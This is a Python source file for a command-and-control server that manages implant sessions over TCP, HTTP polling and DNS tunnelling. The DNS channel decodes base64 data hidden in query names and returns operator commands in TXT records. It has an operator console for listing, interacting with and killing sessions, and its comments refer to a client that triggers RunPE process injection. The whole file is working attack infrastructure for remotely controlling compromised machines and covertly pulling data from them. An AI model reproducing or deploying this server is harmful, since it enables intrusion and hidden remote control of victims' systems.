import asyncio
import aioconsole
import sys
import struct
import base64
import os
import datetime
import json
from core.session import SessionManager

class DNSServerProtocol(asyncio.DatagramProtocol):
    def __init__(self, c2_server):
        self.c2_server = c2_server
    
    def connection_made(self, transport):
        self.transport = transport
    
    def datagram_received(self, data, addr):
        asyncio.create_task(self.c2_server.handle_dns_packet(data, addr, self.transport))

class C2Server:
    def __init__(self):
        self.session_manager = SessionManager()
        self.current_session_id = None # For interaction context
        
        # Logging Setup
        self.log_dir = "logs"
        self.session_log_dir = os.path.join(self.log_dir, "sessions")
        os.makedirs(self.session_log_dir, exist_ok=True)
        self.audit_log_file = os.path.join(self.log_dir, "audit.json")

    def _get_log_path(self, session_id):
        # Using a fixed filename per session ID for simplicity, assuming session IDs are unique per run.
        # If persistence across restarts is needed, we append to existing.
        return os.path.join(self.session_log_dir, f"session_{session_id}.txt")

    def _log_to_file(self, session_id, data):
        try:
            path = self._get_log_path(session_id)
            timestamp = datetime.datetime.now().isoformat()
            with open(path, "a") as f:
                # If data doesn't end with newline, maybe add one? 
                # Raw output usually has newlines.
                f.write(f"[{timestamp}] {data}")
                if not data.endswith('\n'):
                    f.write("\n")
        except Exception as e:
            print(f"[-] Logging error for session {session_id}: {e}")

    def _log_audit(self, command, session_id=None):
        entry = {
            "timestamp": datetime.datetime.now().isoformat(),
            "command": command,
            "session_id": session_id
        }
        try:
            with open(self.audit_log_file, "a") as f:
                f.write(json.dumps(entry) + "\n")
        except Exception as e:
            print(f"[-] Audit logging error: {e}")

    async def handle_tcp_client(self, reader, writer):
        addr = writer.get_extra_info('peername')
        print(f"\n[+] New TCP connection from {addr}")
        session = self.session_manager.create_session(reader, writer, addr, transport="tcp")
        print(f"[*] Session {session.id} opened.")
        self._log_audit(f"New TCP Session {session.id} from {addr}")
        
        try:
            while True:
                data = await reader.read(4096)
                if not data:
                    break
                
                output = data.decode(errors='replace')
                self._handle_output(session, output)

        except Exception as e:
            print(f"[-] Session {session.id} error: {e}")
        finally:
            self._close_session(session)
            writer.close()
            try:
                await writer.wait_closed()
            except:
                pass

    async def handle_http_client(self, reader, writer):
        # Basic HTTP 1.0/1.1 Handler
        try:
            request_line = await reader.readline()
            if not request_line: return
            
            method, path, version = request_line.decode().strip().split()
            headers = {}
            while True:
                line = await reader.readline()
                if not line or line == b'\r\n': break
                parts = line.decode().strip().split(':', 1)
                if len(parts) == 2:
                    headers[parts[0].strip().lower()] = parts[1].strip()
            
            content_length = int(headers.get('content-length', 0))
            body = await reader.read(content_length) if content_length > 0 else b""
            body_str = body.decode(errors='replace')

            # Logic
            response_body = ""
            session = None
            
            # Identify Session
            sess_id_header = headers.get('x-session-id')
            if sess_id_header:
                try:
                    sid = int(sess_id_header)
                    session = self.session_manager.get_session(sid)
                except:
                    pass
            
            addr = writer.get_extra_info('peername')

            if not session:
                # New Session
                session = self.session_manager.create_session(None, None, addr, transport="http")
                print(f"\n[+] New HTTP Session {session.id} from {addr}")
                self._log_audit(f"New HTTP Session {session.id} from {addr}")
                response_body = f"REGISTERED {session.id}"
            else:
                # Existing Session
                if body_str:
                    self._handle_output(session, body_str)
                
                # Check for commands (Poll)
                try:
                    # Non-blocking check or short wait
                    cmd = session.cmd_queue.get_nowait()
                    if cmd.strip():
                        response_body = cmd
                        # If command is EXEC, our client expects it to trigger RunPE.
                        # But typically we send "EXEC" or "whoami".
                        # Our C client checks for "EXEC" to break loop.
                        # Let's say user typed "run" -> we send "EXEC".
                        if cmd.strip() == "run":
                            response_body = "EXEC"
                except asyncio.QueueEmpty:
                    response_body = "" # No command
            
            # Send Response
            # Add Content-Type, etc
            resp = f"HTTP/1.1 200 OK\r\nContent-Length: {len(response_body)}\r\nContent-Type: text/plain\r\n\r\n{response_body}"
            writer.write(resp.encode())
            await writer.drain()

        except Exception as e:
            print(f"[-] HTTP Error: {e}")
        finally:
            writer.close()

    async def handle_dns_packet(self, data, addr, transport):
        # Minimal DNS Parser to extract Query Name
        try:
            # Header is 12 bytes
            if len(data) < 12: return
            trans_id = data[:2]
            flags = data[2:4]
            qdcount = struct.unpack("!H", data[4:6])[0]
            
            if qdcount == 0: return

            # Parse Question Name
            pos = 12
            labels = []
            while True:
                length = data[pos]
                if length == 0:
                    pos += 1
                    break
                pos += 1
                labels.append(data[pos:pos+length].decode(errors='ignore'))
                pos += length
            
            domain_parts = labels
            # Expecting: <data>.<sid>.c2.com
            # Example:  "aGVsbG8=.1.c2.com"
            
            sid = None
            payload = ""
            
            if len(domain_parts) >= 3:
                try:
                    sid = int(domain_parts[1])
                    payload_b64 = domain_parts[0]
                    # Padding fix
                    payload_b64 += "=" * ((4 - len(payload_b64) % 4) % 4)
                    payload = base64.b64decode(payload_b64).decode(errors='ignore')
                except:
                    pass # Not our format
            
            session = None
            if sid:
                session = self.session_manager.get_session(sid)
            
            if sid and not session:
                 # New Session? maybe
                 session = self.session_manager.create_session(None, None, addr, transport="dns")
                 session.id = sid 
                 pass

            if not session and len(domain_parts) > 0 and domain_parts[0] == "register":
                 session = self.session_manager.create_session(None, None, addr, transport="dns")
                 print(f"\n[+] New DNS Session {session.id} from {addr}")
                 self._log_audit(f"New DNS Session {session.id} from {addr}")
                 response_txt = f"ID:{session.id}"
            elif session:
                 if payload:
                     self._handle_output(session, payload)
                 
                 # Check for command
                 try:
                     cmd = session.cmd_queue.get_nowait()
                     response_txt = cmd
                 except asyncio.QueueEmpty:
                     response_txt = ""
            else:
                return # Ignore

            # Construct DNS Response (TXT)
            resp_header = trans_id + b'\x81\x80' + data[4:6] + b'\x00\x01' + b'\x00\x00' + b'\x00\x00'
            
            # Question Section
            q_end = pos + 4
            question_section = data[12:q_end]
            
            # Answer Section
            txt_bytes = base64.b64encode(response_txt.encode()).decode()
            rdata_len = len(txt_bytes) + 1
            rdata = bytes([len(txt_bytes)]) + txt_bytes.encode()
            
            answer_section = b'\xc0\x0c' + b'\x00\x10' + b'\x00\x01' + b'\x00\x00\x00\x00' + struct.pack("!H", rdata_len) + rdata
            
            response_pkt = resp_header + question_section + answer_section
            transport.sendto(response_pkt, addr)

        except Exception as e:
            # print(f"[-] DNS Error: {e}") 
            pass


    def _handle_output(self, session, output):
        # Log to file
        self._log_to_file(session.id, f"[IMPLANT] > {output}")
        
        if self.current_session_id == session.id:
            print(output, end='', flush=True)
        else:
            # print(f"\n[Session {session.id}]: {output}", end='', flush=True)
            pass

    def _close_session(self, session):
        print(f"\n[-] Session {session.id} closed.")
        self._log_audit(f"Session {session.id} closed", session.id)
        self.session_manager.remove_session(session.id)
        if self.current_session_id == session.id:
            self.current_session_id = None
            print("\n[*] Interaction ended (Session closed). Press Enter.")

    async def start_server(self, port, protocol="tcp"):
        self._log_audit(f"Starting C2 Server on port {port} ({protocol})")
        if protocol == "tcp":
            server = await asyncio.start_server(self.handle_tcp_client, '0.0.0.0', port)
            addr = server.sockets[0].getsockname()
            print(f"[*] TCP C2 Server listening on {addr}")
            async with server:
                await asyncio.gather(server.serve_forever(), self.admin_console())
        
        elif protocol == "http":
            server = await asyncio.start_server(self.handle_http_client, '0.0.0.0', port)
            addr = server.sockets[0].getsockname()
            print(f"[*] HTTP C2 Server listening on {addr}")
            async with server:
                await asyncio.gather(server.serve_forever(), self.admin_console())
        
        elif protocol == "dns":
            loop = asyncio.get_running_loop()
            transport, protocol = await loop.create_datagram_endpoint(
                lambda: DNSServerProtocol(self),
                local_addr=('0.0.0.0', int(port))
            )
            print(f"[*] DNS C2 Server listening on 0.0.0.0:{port}")
            try:
                await self.admin_console()
            finally:
                transport.close()

    async def admin_console(self):
        print("[*] C2 Admin Console Ready. Type 'help' for commands.")
        while True:
            try:
                # Prompt changes if interacting
                prompt = "C2> "
                if self.current_session_id:
                    prompt = f"Session {self.current_session_id}> "
                
                cmd = await aioconsole.ainput(prompt)
                
                if not cmd.strip():
                    continue
                
                # Audit Log
                self._log_audit(cmd, self.current_session_id)

                if self.current_session_id:
                    # Log Input
                    self._log_to_file(self.current_session_id, f"[OPERATOR] > {cmd}")
                    
                    # Send to session
                    if cmd == "background":
                        self.current_session_id = None
                        print("[*] Backgrounded session.")
                    else:
                        session = self.session_manager.get_session(self.current_session_id)
                        if session:
                             await session.send(cmd + "\n")
                        else:
                            print("[-] Session lost.")
                            self.current_session_id = None
                else:
                    # Admin commands
                    parts = cmd.split()
                    op = parts[0]
                    
                    if op == "list":
                        print("Active Sessions:")
                        if not self.session_manager.sessions:
                            print("  No active sessions.")
                        for sid, s in self.session_manager.sessions.items():
                            print(f"  {sid}: {s.addr} ({s.transport})")
                    elif op == "interact":
                        if len(parts) < 2:
                            print("Usage: interact <id>")
                            continue
                        try:
                            sid = int(parts[1])
                            if self.session_manager.get_session(sid):
                                self.current_session_id = sid
                                print(f"[*] Interacting with session {sid}. Type 'background' to exit.")
                            else:
                                print("[-] Invalid session ID.")
                        except ValueError:
                            print("[-] Invalid ID format.")
                    elif op == "kill":
                        if len(parts) < 2:
                            print("Usage: kill <id>")
                            continue
                        try:
                            sid = int(parts[1])
                            session = self.session_manager.get_session(sid)
                            if session:
                                if session.writer:
                                    session.writer.close()
                                self.session_manager.remove_session(sid)
                                print(f"[*] Killed session {sid}")
                            else:
                                print("[-] Invalid session ID.")
                        except:
                            print("[-] Error killing session.")
                    elif op == "help":
                        print("Commands: list, interact <id>, kill <id>, help, exit")
                    elif op == "exit":
                        print("[*] Exiting...")
                        sys.exit(0)
                    else:
                        print("[-] Unknown command.")
            except Exception as e:
                print(f"[-] Console error: {e}")
